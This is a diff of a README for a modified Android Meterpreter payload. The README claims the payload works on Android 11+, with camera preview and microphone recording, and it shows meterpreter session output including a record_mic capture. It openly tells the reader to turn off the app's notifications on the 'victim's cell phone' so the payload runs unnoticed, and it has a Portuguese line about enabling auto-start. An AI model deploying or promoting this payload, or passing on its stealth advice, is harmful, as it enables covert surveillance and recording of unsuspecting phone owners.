@@ -2,8 +2,6 @@
 <img src="https://cloud.githubusercontent.com/assets/7417870/12315404/6dd58120-bab5-11e5-8a10-d5fec03d38d2.gif" width="100" align="right">
 Meterpreter payload modified for Android, make it compatible with Android 11+, functions such as camera preview and microphone recording are working properly.
 
-Habilitar permissão de inicialização automática e configuração restrita
-
 I recommend that after installing the payload on the victim's cell phone, disable the app's notification permission, to make the payload quieter.
 ```
 meterpreter > sysinfo
@@ -23,6 +21,8 @@ meterpreter > record_mic -d 5
 Audio saved to: /root/android/TLbcSexf.wav
 meterpreter >
 ```
+
+Habilite as permissão de inicialização automática e configuração restrita.
 
 Setting:
 
